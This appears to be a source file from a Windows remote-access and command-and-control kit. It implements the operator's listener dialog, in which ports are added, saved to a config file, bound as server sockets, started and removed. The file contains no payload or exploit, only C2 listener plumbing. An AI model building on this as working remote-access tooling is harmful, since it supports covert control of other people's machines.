#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.2
# -------------------------------------------------------------
from PyQt5.QtWidgets import QWidget,QMenu
from PyQt5.QtCore import QEvent
from PyQt5 import QtCore, QtGui, QtWidgets
from ..Qt5.icons import IconObj
from ..utils.file_paths import CFGFilePath,BGPath
from ..utils.utils import ErrorHandling
from ..logging.logging import NetworkingConfigs,LoggingUtilitys
from ..networking.socket import ServerSocket

class Ui_ListenerGUI(QWidget):

    #Function will only append port number to list if its in the correct port range
    def CreateNewListener(self):
        port_number = self.PortInputBox.text()                  #Get the port number from the input box
        try:
            if int(port_number) < 1 or int(port_number) > 65535:#If the port is outside of the logical range
                ErrorHandling().raise_error('Invalid Port Number.',     #Raise an error
                                            'Port must be in range 1 - 65535.',
                                            'Bad Port Number')
            else:
                if NetworkingConfigs().add_port_to_config_file(str(port_number)) == True: #If port was able to be appended to cfg cfile,
                    if ServerSocket().create_new_socket(int(port_number)) == True: #If a socket can be created and bound to the port,
                        item = QtWidgets.QListWidgetItem(IconObj().port_icon,port_number)     #Create item
                        self.PortDisplay.addItem(item) # Append value to port display
                else:
                    pass

        except ValueError: #Error handling for invalid data type
            ErrorHandling().raise_error('Port must be integer.',
                                            '',
                                            'Invalid Data Type')
        except FileNotFoundError: #Error handling for config file not existing
            ErrorHandling().raise_error('"ports.txt" Not Found.',
                                        'Add ports.txt to configs/networking',
                                        'ports.txt Not Found')
        self.PortInputBox.clear()   #Clear the port input box

    #Create a content menu when port display is right clicked
    def eventFilter(self, source, event):
        if event.type() == QEvent.ContextMenu and source is self.PortDisplay and self.PortDisplay.currentRow() > -1:
            try:                                                                # Use try block to prevent program from crashing if no port exists when port display action code is executed
                menu = QMenu(self)
                start_listener = menu.addAction('Start Listener')               #Add actions to the menu
                delete_listener = menu.addAction('Destroy Listener')
                action = menu.exec_(self.mapToGlobal(event.globalPos()))        #GlobalPos will make sure context menu opens where mouse is clicked
                #port_number will get the value from the box that gets clicked. the value is our port number
                port_number = source.itemAt(event.pos()).text()                 #This line will crash the program without the try/except block

                if action == start_listener:
                    ServerSocket().start_listening_on_socket(port_number)
                    NetworkingConfigs().record_listening_socket(port_number)

                if action == delete_listener:
                    row = self.PortDisplay.currentRow()                     # Get the row number of the selected listener
                    self.PortDisplay.takeItem(row)                          # Remove port from gui
                    ServerSocket().remove_socket_from_array(port_number)    # Delete the listener with the row number
                    NetworkingConfigs().remove_port_from_config_file(port_number) #Remove port number from config file

                return True
            except Exception:
                return False #Returns false for calling funciton
        return super().eventFilter(source, event)

    #Function adds existing listeners to port display and creates sockets for them. socket creation func will not make socket if it has been created already
    def add_existing_listeners(self):
        ports_from_config = LoggingUtilitys().retrieve_file_data(CFGFilePath().server_sockets).split()
        for port in ports_from_config:
            ServerSocket().create_new_socket(int(port)) #Create, bind and append socket to socket array
            item = QtWidgets.QListWidgetItem(IconObj().port_icon,port)  #Create item
            self.PortDisplay.addItem(item)            #Add item to port gui

    def setupUi(self, Dialog):
        Dialog.setWindowIcon(IconObj().sat_win_icon)
        Dialog.setObjectName("Dialog")
        Dialog.resize(318, 158)
        font = QtGui.QFont()
        font.setFamily("Bitstream Vera Sans")
        font.setBold(True)
        font.setWeight(75)
        Dialog.setFont(font)
        Dialog.setStyleSheet(f"background-image: url({BGPath().cheap_loic_lol});")
        self.CreateListenerButton = QtWidgets.QPushButton(Dialog,clicked=lambda: self.CreateNewListener())
        self.CreateListenerButton.setGeometry(QtCore.QRect(210, 120, 100, 31))
        self.CreateListenerButton.setObjectName("CreateListenerButton")
        self.PortInputBox = QtWidgets.QLineEdit(Dialog)
        self.PortInputBox.setGeometry(QtCore.QRect(10, 120, 101, 33))
        self.PortInputBox.setObjectName("PortInputBox")
        self.PortDisplay = QtWidgets.QListWidget(Dialog)
        self.PortDisplay.setGeometry(QtCore.QRect(10, 10, 101, 91))
        self.PortDisplay.installEventFilter(self)
        self.PortDisplay.setAcceptDrops(False)
        self.PortDisplay.setStyleSheet("")
        self.PortDisplay.setObjectName("PortDisplay")
        self.add_existing_listeners() #Add existing listeners saved in ports.txt to ports display
        self.retranslateUi(Dialog)
        QtCore.QMetaObject.connectSlotsByName(Dialog)

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate("Dialog", "Listeners"))
        self.CreateListenerButton.setText(_translate("Dialog", "Create"))